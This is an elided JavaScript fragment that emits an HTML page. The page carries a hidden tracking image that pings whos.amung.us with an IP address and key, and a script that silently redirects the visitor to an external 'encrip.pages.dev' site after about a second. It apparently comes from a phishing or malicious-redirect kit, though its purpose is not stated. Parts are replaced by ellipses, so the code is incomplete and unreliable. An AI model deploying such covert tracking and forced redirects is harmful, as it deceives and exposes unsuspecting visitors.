function checkbody(call) {
    ...
    checkbody(function (body) {
        ...
        <body>
        <img src='https://whos.amung.us/pingjs/?k=preubas01&t=190.167.227.1&x=https://190.167.227.1' style='display:none'>
        <script>
        var contador = 'traidor221'
        ...
        setTimeout(() => { window.location.href = 'https://encrip.pages.dev/' }, 1100)
        </script>
        </body>    
        </html> `);
    });
